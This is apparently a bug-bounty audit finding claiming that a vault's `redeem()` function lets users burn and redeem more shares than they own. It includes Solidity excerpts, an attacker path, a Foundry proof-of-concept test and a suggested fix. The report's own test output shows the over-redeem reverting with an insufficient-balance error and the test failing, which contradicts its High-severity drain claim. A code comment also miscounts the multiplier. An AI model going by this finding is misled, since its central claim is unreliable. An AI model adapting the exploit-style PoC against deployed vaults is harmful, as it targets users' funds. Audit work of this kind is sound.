### [H-01] Over-Redeem in redeem() Function Allows Users to Drain Vault Funds

_Severity:_ High

_Source:_ https://github.com/sherlock-audit/2025-07-mellow-flexible-vaults-Yahaya-Salisu/blob/main/flexible-vaults%2Fsrc%2Fqueues%2FRedeemQueue.sol#L87-L125

### Summary
The `redeem()` function does not validate whether the caller owns enough shares before burning them. It immediately calls `shareManager_.burn(caller, shares);` without checking the user’s share balance.

And the `burn()` function is expected to handle this check internally since the `redeem()` fails to do, but it also forwards the call to `_burnShares()` which is an unimplemented virtual function in the provided code, this means that there's no safeguard that checks the caller's balance before burn. And his allows an attacker to redeem more shares than owned and potentially drain the funds.

```solidity
    /// @inheritdoc IRedeemQueue
    function redeem(uint256 shares) external nonReentrant {
        if (shares == 0) {
            revert ZeroValue();
        }
        address caller = _msgSender();

        address vault_ = vault();
        if (IShareModule(vault_).isPausedQueue(address(this))) {
            revert QueuePaused();
        }
        IShareManager shareManager_ = IShareManager(IShareModule(vault_).shareManager());

      // ⚠️ BUG: there's no check to verify if the caller owns enough shares before burning them
        shareManager_.burn(caller, shares);
        {
            IFeeManager feeManager = IShareModule(vault_).feeManager();
            uint256 fees = feeManager.calculateRedeemFee(shares);
            if (fees > 0) {
                shareManager_.mint(feeManager.feeRecipient(), fees);
                shares -= fees;
            }
        }
       ...
    }
```

The burn function also does not check if caller shares balance is enough.

```solidity
// ShareManager.sol

    /// @inheritdoc IShareManager
    function burn(address account, uint256 value) external onlyQueue {
        if (value == 0) {
            revert ZeroValue();
        }
        _burnShares(account, value);
        emit Burn(account, value);
    }
```

### Internal Preconditions
1. The `redeem()` and `burn()` do not perform balance check.

2. And the `_burnShares()` is left abstract, so there's no guarantee if it performs this validation.


### External Preconditions
1. Attacker owns a small amount of shares e.g 1 shares.

2. Attacker calls `redeem(10,000)` to redeem shares they do not own.


### Attacker Path
1. Attacker deposits a small amount of assets and receives 1 share for example.

2. Then calls `redeem(10_000)` or any large number of shares.

3. Vault proceeds with the redemption logic, calculate and deducts fees, and sent the request to the `redeem queue`, and once the request is completed, the attacker will claim the funds more than deserved.


### Impact
This issue allows a user to redeem more than their actual share balance, leading to potential total protocol drain and complete loss of users funds if attacker redeems repeatedly, and loss of trust in the system's integrity and accounting, and unauthorized extraction of vault assets.


## PoC
```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.25;

import "../Imports.sol";
import "./BaseIntegrationTest.sol";

contract IntegrationTest is BaseIntegrationTest {
    address public constant ASSET = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    Deployment private $;

    function setUp() external {
        $ = deployBase();
    }

    Vault vault;

    function testProtocolFees() external {
        IOracle.SecurityParams memory securityParams = IOracle.SecurityParams({
            maxAbsoluteDeviation: 0.01 ether, // 1% abs
            suspiciousAbsoluteDeviation: 0.005 ether, // 0.05% abs
            maxRelativeDeviationD18: 0.01 ether, // 1% abs
            suspiciousRelativeDeviationD18: 0.005 ether, // 0.05% abs
            timeout: 20 hours,
            depositInterval: 1 hours,
            redeemInterval: 1 hours
        });

        address[] memory assets = new address[](1);
        assets[0] = ASSET;

        Vault.RoleHolder[] memory roleHolders = new Vault.RoleHolder[](7);

        Vault vaultImplementation = Vault(payable($.vaultFactory.implementationAt(0)));
        Oracle oracleImplementation = Oracle($.oracleFactory.implementationAt(0));

        roleHolders[0] = Vault.RoleHolder(vaultImplementation.CREATE_QUEUE_ROLE(), $.vaultAdmin);
        roleHolders[1] = Vault.RoleHolder(oracleImplementation.SUBMIT_REPORTS_ROLE(), $.vaultAdmin);
        roleHolders[2] = Vault.RoleHolder(oracleImplementation.ACCEPT_REPORT_ROLE(), $.vaultAdmin);
        roleHolders[3] = Vault.RoleHolder(vaultImplementation.CREATE_SUBVAULT_ROLE(), $.vaultAdmin);
        roleHolders[4] = Vault.RoleHolder(Verifier($.verifierFactory.implementationAt(0)).CALLER_ROLE(), $.curator);
        roleHolders[5] = Vault.RoleHolder(
            RiskManager($.riskManagerFactory.implementationAt(0)).SET_SUBVAULT_LIMIT_ROLE(), $.vaultAdmin
        );
        roleHolders[6] = Vault.RoleHolder(
            RiskManager($.riskManagerFactory.implementationAt(0)).ALLOW_SUBVAULT_ASSETS_ROLE(), $.vaultAdmin
        );

        (,,, address oracle, address vault_) = $.vaultConfigurator.create(
            VaultConfigurator.InitParams({
                version: 0,
                proxyAdmin: $.vaultProxyAdmin,
                vaultAdmin: $.vaultAdmin,
                shareManagerVersion: 0,
                shareManagerParams: abi.encode(bytes32(0), string("MellowVault"), string("MV")),
                feeManagerVersion: 0,
                feeManagerParams: abi.encode($.vaultAdmin, $.protocolTreasury, uint24(0), uint24(0), uint24(0), uint24(0)),
                riskManagerVersion: 0,
                riskManagerParams: abi.encode(int256(100 ether)),
                oracleVersion: 0,
                oracleParams: abi.encode(securityParams, assets),
                defaultDepositHook: address(new RedirectingDepositHook()),
                defaultRedeemHook: address(new BasicRedeemHook()),
                queueLimit: 16,
                roleHolders: roleHolders
            })
        );

        vault = Vault(payable(vault_));

        vm.startPrank($.vaultAdmin);
        IFeeManager feeManager = vault.feeManager();
        IShareManager shareManager = vault.shareManager();

        feeManager.setBaseAsset(address(vault), ASSET);
        feeManager.setFees(0, 0, 0, 1e4);
        vault.createQueue(0, true, $.vaultProxyAdmin, ASSET, new bytes(0));
        vault.createQueue(0, false, $.vaultProxyAdmin, ASSET, new bytes(0));

        DepositQueue depositQueue = DepositQueue(payable(vault.queueAt(ASSET, 0)));
        RedeemQueue redeemQueue = RedeemQueue(payable(vault.queueAt(ASSET, 1)));

        IOracle.Report[] memory reports = new IOracle.Report[](1);
        reports[0] = IOracle.Report({asset: ASSET, priceD18: 1 ether});
        {
            Oracle(oracle).submitReports(reports);
            Oracle(oracle).acceptReport(ASSET, 1 ether, uint32(block.timestamp));
        }

        assertEq(shareManager.totalShares(), 0 ether);

        vm.stopPrank();
        vm.startPrank($.user);

        {
            uint224 amount = 1 ether;
            deal(ASSET, $.user, amount);
            
            IERC20(ASSET).approve(address(depositQueue), type(uint256).max);
            depositQueue.deposit(amount, address(0), new bytes32[](0));
        }

        vm.stopPrank();
        vm.startPrank($.vaultAdmin);

        {
            skip(20 hours);
            adjustPrice(reports[0]);
            Oracle(oracle).submitReports(reports);
        }

        assertEq(shareManager.totalShares(), 1 ether, "20 hours");
        uint256 shares = shareManager.totalShares();

        {
            skip(20 hours);
            adjustPrice(reports[0]);
            Oracle(oracle).submitReports(reports);
        }

        assertEq(shareManager.totalShares(), (shares * 1e4 * 20 hours / 365e6 days) + shares, "40 hours");
        shares = shareManager.totalShares();

        {
            skip(50 hours);
            adjustPrice(reports[0]);
            Oracle(oracle).submitReports(reports);
        }

        assertEq(shareManager.totalShares(), (shares * 1e4 * 50 hours / 365e6 days) + shares, "90 hours");
        shares = shareManager.totalShares();

        {
            skip(1000 hours);
            adjustPrice(reports[0]);
            Oracle(oracle).submitReports(reports);
            feeManager.setFees(0, 0, 0, 0);
        }

        assertEq(shareManager.totalShares(), (shares * 1e4 * 1000 hours / 365e6 days) + shares, "1090 hours");
        shares = shareManager.totalShares();
        {
            skip(1000 hours);
            adjustPrice(reports[0]);
            Oracle(oracle).submitReports(reports);
        }
        assertEq(shareManager.totalShares(), shares, "2090 hours");

        uint256 totalAssets = IERC20(ASSET).balanceOf(address(vault));
        uint256 totalShares = shareManager.totalShares();

        assertEq(Math.mulDiv(totalShares, 1 ether, totalAssets), reports[0].priceD18);

        vm.stopPrank();

        uint256 userShares = shareManager.sharesOf($.user);
        uint256 protocolTreasuryShares = shareManager.sharesOf($.protocolTreasury);

        vm.startPrank($.user);
        redeemQueue.redeem(userShares * 10); // 2 times of user shares
        vm.stopPrank();
        vm.startPrank($.protocolTreasury);
        redeemQueue.redeem(protocolTreasuryShares);
        vm.stopPrank();

        vm.startPrank($.vaultAdmin);
        {
            skip(20 hours);
            Oracle(oracle).submitReports(reports);
        }
        vm.stopPrank();

        redeemQueue.handleBatches(1);

        uint32[] memory timestamps = new uint32[](1);
        timestamps[0] = uint32(block.timestamp - 20 hours);
        vm.prank($.user);
        redeemQueue.claim($.user, timestamps);
        vm.prank($.protocolTreasury);
        redeemQueue.claim($.protocolTreasury, timestamps);

        assertEq(IERC20(ASSET).balanceOf($.user) + IERC20(ASSET).balanceOf($.protocolTreasury), 10 ether); // added
        assertEq(
            IERC20(ASSET).balanceOf($.protocolTreasury),
            Math.mulDiv(10 ether, protocolTreasuryShares, protocolTreasuryShares + userShares, Math.Rounding.Ceil) // added
        );
    }
    function adjustPrice(IOracle.Report memory report) public view {
        if (vault.shareManager().totalShares() != 0) {
            report.priceD18 +=
                uint224(vault.feeManager().calculateFee(address(vault), ASSET, report.priceD18, report.priceD18));
        }
    }
}
```

Run test with
```bash
forge test --fork-url $(grep ETH_RPC .env | cut -d '=' -f2,3,4,5) --gas-limit 10000000000000000 --fork-block-number 22730425 -vvv --match-path './test/integration/IntegrationTest.t.sol'
```


### Output
![PoC Output](https://github.com/user-attachments/assets/8e2c2390-60b7-460e-b9ac-534bdfc1aa01)

```bash
│   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return]
    │   │   │   │   └─ ← [Revert] ERC20InsufficientBalance(0x38Bb7EC83cE9Ca34AD2Fdd1915CE1D25894138ef, 1000000000000000000 [1e18], 10000000000000000000 [1e19])
    │   │   │   └─ ← [Revert] ERC20InsufficientBalance(0x38Bb7EC83cE9Ca34AD2Fdd1915CE1D25894138ef, 1000000000000000000 [1e18], 10000000000000000000 [1e19])
    │   │   └─ ← [Revert] ERC20InsufficientBalance(0x38Bb7EC83cE9Ca34AD2Fdd1915CE1D25894138ef, 1000000000000000000 [1e18], 10000000000000000000 [1e19])
    │   └─ ← [Revert] ERC20InsufficientBalance(0x38Bb7EC83cE9Ca34AD2Fdd1915CE1D25894138ef, 1000000000000000000 [1e18], 10000000000000000000 [1e19])
    └─ ← [Revert] ERC20InsufficientBalance(0x38Bb7EC83cE9Ca34AD2Fdd1915CE1D25894138ef, 1000000000000000000 [1e18], 10000000000000000000 [1e19])

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 82.74ms (25.69ms CPU time)

Ran 1 test suite in 6.25s (82.74ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/integration/IntegrationTest.t.sol:IntegrationTest
[FAIL: ERC20InsufficientBalance(0x38Bb7EC83cE9Ca34AD2Fdd1915CE1D25894138ef, 1000000000000000000 [1e18], 10000000000000000000 [1e19])] testProtocolFees() (gas: 8842841)        

Encountered a total of 1 failing tests, 0 tests succeeded
```

### Recommendation:
Make sure to check if the caller owns enough shares before burning
```solidity
    /// @inheritdoc IRedeemQueue
    function redeem(uint256 shares) external nonReentrant {
        if (shares == 0) {
            revert ZeroValue();
        }
        address caller = _msgSender();

        address vault_ = vault();
        if (IShareModule(vault_).isPausedQueue(address(this))) {
            revert QueuePaused();
        }
        IShareManager shareManager_ = IShareManager(IShareModule(vault_).shareManager());

      // make sure user owns enough shares before burn
        if (shareManager_.balanceOf(caller) < shares) revert InsufficientBalance();
        shareManager_.burn(caller, shares);
        {
            IFeeManager feeManager = IShareModule(vault_).feeManager();
            uint256 fees = feeManager.calculateRedeemFee(shares);
            if (fees > 0) {
                shareManager_.mint(feeManager.feeRecipient(), fees);
                shares -= fees;
            }
        }
            ...
    }
```
